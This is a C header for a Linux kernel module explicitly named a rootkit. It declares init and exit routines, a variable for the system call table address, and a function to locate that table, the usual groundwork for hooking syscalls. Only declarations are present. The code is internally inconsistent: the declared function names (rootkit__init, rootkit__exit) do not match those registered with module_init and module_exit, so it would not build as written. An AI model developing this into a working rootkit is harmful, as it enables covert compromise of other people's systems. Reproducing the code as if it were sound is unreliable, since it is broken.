#ifndef rootkit_H
#define rootkit_H

#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

unsigned long syscall_table_addr;

/* module cleanup */
void __exit rootkit__exit(void);

/* module initialization */
int __init rootkit__init(void);

/**
 * Finds a system call table. This should be done during compile time
 *
 * @return 0 if success, EFAULT if failure
 */
static int locate_syscall_table();

MODULE_LICENSE("GPL");

module_init(rootkit_init);
module_exit(rootkit_exit);
